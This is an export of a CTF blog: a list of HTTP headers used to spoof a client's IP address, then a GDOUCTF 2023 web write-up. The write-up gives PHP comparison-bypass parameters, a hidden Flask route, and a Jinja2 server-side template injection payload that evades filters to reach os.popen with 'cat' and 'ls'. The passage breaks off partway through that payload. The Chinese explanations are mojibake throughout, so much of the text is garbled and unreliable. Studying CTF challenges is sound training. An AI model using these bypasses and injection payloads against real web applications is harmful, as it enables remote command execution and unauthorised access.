    <url>/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For:"></a>X-Forwarded-For:</h3><p>è¯¥å­—æ®µåŒ…å«å®¢æˆ·ç«¯é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘çš„IPåœ°å€ï¼Œè¿™é€šå¸¸ç”¨äºéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚</p>
<h3 id="Client-ip"><a href="#Client-ip" class="headerlink" title="Client-ip:"></a>Client-ip:</h3><p>è¯¥å­—æ®µåŒ…å«å®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦ä¸æœåŠ¡å™¨åœ¨åŒä¸€ç½‘ç»œä¸­ã€‚</p>
<h3 id="X-Client-IP"><a href="#X-Client-IP" class="headerlink" title="X-Client-IP:"></a>X-Client-IP:</h3><p>è¯¥å­—æ®µåŒ…å«å®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦ä¸æœåŠ¡å™¨åœ¨åŒä¸€ç½‘ç»œä¸­ã€‚</p>
<h3 id="X-Remote-IP"><a href="#X-Remote-IP" class="headerlink" title="X-Remote-IP:"></a>X-Remote-IP:</h3><p>è¯¥å­—æ®µåŒ…å«æœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯æœåŠ¡å™¨æ˜¯å¦ä¸å®¢æˆ·ç«¯åœ¨åŒä¸€ç½‘ç»œä¸­ã€‚</p>
<h3 id="X-Rriginating-IP"><a href="#X-Rriginating-IP" class="headerlink" title="X-Rriginating-IP:"></a>X-Rriginating-IP:</h3><p>è¯¥å­—æ®µåŒ…å«æœåŠ¡å™¨ç¼“å­˜ä¸­ä¿å­˜çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯æœåŠ¡å™¨æ˜¯å¦åœ¨æœ¬åœ°ç¼“å­˜ä¸­ä¿å­˜äº†å®¢æˆ·ç«¯çš„IPåœ°å€ã€‚</p>
<h3 id="X-Remote-addr"><a href="#X-Remote-addr" class="headerlink" title="X-Remote-addr:"></a>X-Remote-addr:</h3><p>è¯¥å­—æ®µåŒ…å«æœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯æœåŠ¡å™¨æ˜¯å¦ä¸å®¢æˆ·ç«¯åœ¨åŒä¸€ç½‘ç»œä¸­ã€‚</p>
<h3 id="HTTP-CLIENT-IP"><a href="#HTTP-CLIENT-IP" class="headerlink" title="HTTP_CLIENT_IP:"></a>HTTP_CLIENT_IP:</h3><p>è¯¥å­—æ®µåŒ…å«å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚æ—¶ä½¿ç”¨çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯HTTPè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€å®¢æˆ·ç«¯ã€‚</p>
<h3 id="X-Real-IP"><a href="#X-Real-IP" class="headerlink" title="X-Real-IP:"></a>X-Real-IP:</h3><p>è¯¥å­—æ®µåŒ…å«å®¢æˆ·ç«¯çš„çœŸå®IPåœ°å€ï¼Œç”¨äºéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦ä¸æœåŠ¡å™¨åœ¨åŒä¸€ç½‘ç»œä¸­ã€‚</p>
<h3 id="X-Originating-IP"><a href="#X-Originating-IP" class="headerlink" title="X-Originating-IP:"></a>X-Originating-IP:</h3><p>è¯¥å­—æ®µåŒ…å«æœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œç”¨äºéªŒè¯æœåŠ¡å™¨æ˜¯å¦å‘èµ·äº†è¯¥HTTPè¯·æ±‚ï¼Œè¯¥åœ°å€åº”ä¸HTTPå“åº”ç›¸åŒ¹é…ã€‚</p>
<h3 id="via"><a href="#via" class="headerlink" title="via:"></a>via:</h3><p>è¯¥å­—æ®µåŒ…å«é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘çš„ IP åœ°å€ï¼Œè¿™é€šå¸¸ç”¨äºéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>GDOUCTF 2023</title>
    <url>/2023/04/17/GDOUCTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h3><p><strong>JS</strong><br><img src="https://img-blog.csdnimg.cn/83a1d5e00991490b8df76fbf9ff9b211.png" alt="1"><br>åƒé‡åˆ°æ¸¸æˆé¢˜ç›®å¸¸è§„æ€è·¯å°±æ˜¯F12æ”¹æ•°æ®æˆ–è€…è°ƒè¯•ï¼Œæœ¬é¢˜ä¹Ÿä¸€æ ·ã€‚ç”±äºæœ¬é¢˜æ¸¸æˆè¿‡ç¨‹ä¸­é€Ÿåº¦ä¼šè¶Šæ¥è¶Šå¿«ï¼Œåœ¨jsä»£ç ä¸­å¯»æ‰¾speedçš„é€»è¾‘ã€‚<br><img src="https://img-blog.csdnimg.cn/17ccc8f0652c48a4936ccf77acc9ec2a.png" alt="2"><br>è°ƒè¯•ä¸€ä¸‹æ”¹ä¸º**this.speed;**ç„¶åç„¶ä»–è¿è¡Œä¸€æ®µæ—¶é—´å°±å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/17dfe7a150b248e5bae600152eb3f4be.png" alt="2"></p>
<h3 id="å—ä¸äº†ä¸€ç‚¹"><a href="#å—ä¸äº†ä¸€ç‚¹" class="headerlink" title="å—ä¸äº†ä¸€ç‚¹"></a>å—ä¸äº†ä¸€ç‚¹</h3><p><strong>å®¡è®¡ä»£ç </strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'j0k3r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                  <span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                  <span class="token variable">$bbb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$bbb</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$aaa</span><span class="token operator">!=</span><span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                   <span class="token variable">$give</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cancanwordflag'</span><span class="token punctuation">;</span>
                   <span class="token variable">$get</span> <span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>
                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$give</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
                   <span class="token punctuation">&#125;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                         <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ´—æ´—ç¡å§"</span><span class="token punctuation">;</span>
                 <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"è¡Œä¸è¡Œå•Šç»†ç‹—"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'èœèœ'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å°±è¿™?"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"åˆ«æ¥æ²¾è¾¹"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å±‚å±‚ç»•è¿‡ã€‚<br>GET<br><code>?aaa=114514a&amp;bbb=114514b&amp;a=flag&amp;flag=a</code><br>POST<br><code>gdou[]=1&amp;ctf[]=2</code><br>COOKIE<br><code>cookie=j0k3r</code><br><img src="https://img-blog.csdnimg.cn/4a2c6f2e48e24be696a551a8aa9ca7fc.png" alt="3"></p>
<h3 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h3><p><strong>æºç æ³„éœ²</strong><br>æŸ¥çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/a8e1c77c98894795bc9d1f5ebfbc0d8e.png" alt="3"><br>è®¿é—®&#x2F;srcä¸‹è½½æºç </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> flask

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è®¿é—®<code>/super-secret-route-nobody-will-guess</code>burpæŠ“åŒ…GETæ”¹ä¸ºPUTå¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/f428cefb45aa4c01abc3e53ba9b68ffc.png" alt="5"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h3><p><strong>pythonæ¡†æ¶jinja2 SSTIæ¼æ´</strong><br>æœ‰å­¦ä¹ ä»·å€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/0c4046d1d8424ffba759b0ee71cfc198.png" alt="6"></p>
<p><code>æŠ¥é”™å‡ºæ¡†æ¶ï¼Œä½¿ç”¨&#123;&#123;&#125;&#125;ä¸è¡Œï¼Œçœ‹æ¥è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ã€‚</code></p>
<p><img src="https://img-blog.csdnimg.cn/d8a9ca545e6d41df9e13375ff8a2a8f4.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/c5d8870ec29a4b3599c606cbff32dca9.png" alt="7"><br><img src="https://img-blog.csdnimg.cn/106cfa10d2934b5887fc065029a1886f.png" alt="8"><br>æˆåŠŸæ‰§è¡Œã€‚FUZZæµ‹è¯•ä¸€ä¸‹è¿‡æ»¤äº†å“ªäº›å­—ç¬¦<br><img src="https://img-blog.csdnimg.cn/6799efdd8ebf402abcbf0bce782a6c80.png" alt="9"></p>
<blockquote>
<p>è¿‡æ»¤å­—ç¬¦å¦‚ä¸Šã€‚</p>
</blockquote>
<p>å‚è€ƒåšå®¢<a href="https://blog.csdn.net/weixin_52635170/article/details/129856818">ç»•è¿‡å§¿åŠ¿</a><br>å…ˆæŠŠæ•°å­—å…¨ç»™è·å–äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/b1e9d4878b3142b1a1155b16fc9ee167.png" alt="1"><br>ç„¶åå¼€å§‹<strong>æ‹¼æ¥payload</strong><br>å‚è€ƒ<a href="https://blog.csdn.net/Jayjay___/article/details/130186511">wp</a>ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># é¦–å…ˆæ„é€ å‡ºæ‰€éœ€çš„æ•°å­—: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> zero <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 0, ä¹Ÿå¯ä»¥ä½¿ç”¨lenghtè¿‡æ»¤å™¨è·å–æ•°å­—</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> one <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">**</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 1</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> two <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 2</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> four <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 4</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> five <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 5</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> three <span class="token operator">=</span> five<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 3</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> nine <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">-</span>five<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 9</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> seven <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 7</span>

<span class="token comment"># æ„é€ å‡ºæ‰€éœ€çš„å„ç§å­—ç¬¦ä¸å­—ç¬¦ä¸²: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> space <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ç©ºæ ¼</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point <span class="token operator">=</span> self<span class="token operator">|</span><span class="token builtin">float</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># .</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>c<span class="token operator">=</span>aa<span class="token punctuation">)</span><span class="token operator">|</span>reverse<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># å­—ç¬¦ c</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfh <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ç™¾åˆ†å· %</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfhc <span class="token operator">=</span> bfh<span class="token operator">~</span>c <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># è¿™é‡Œæ„é€ äº†%c, ä¹‹åå¯ä»¥åˆ©ç”¨è¿™ä¸ª%cæ„é€ ä»»æ„å­—ç¬¦ã€‚~ç”¨äºå­—ç¬¦è¿æ¥</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> slas <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>seven<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ä½¿ç”¨%cæ„é€ æ–œæ  /</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> yin <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>three<span class="token operator">~</span>nine<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ä½¿ç”¨%cæ„é€ å¼•å· '</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">~</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ä½¿ç”¨%cæ„é€ ä¸‹åˆ’çº¿ _</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> right <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ä½¿ç”¨%cæ„é€ å³æ‹¬å· )</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> left <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># ä½¿ç”¨%cæ„é€ å·¦æ‹¬å· (</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> but <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>aa<span class="token punctuation">,</span>tins<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> imp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>aa<span class="token punctuation">,</span>ort<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># import</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pon <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>aa<span class="token punctuation">,</span>pen<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># popen</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> so <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># os</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ca <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ca<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># cat</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> l <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>l<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>           <span class="token comment">#ls     //&#123;%%0cset%0cls%0c=%0cdict(l=aa,s=dd)|join%0c%&#125;</span>
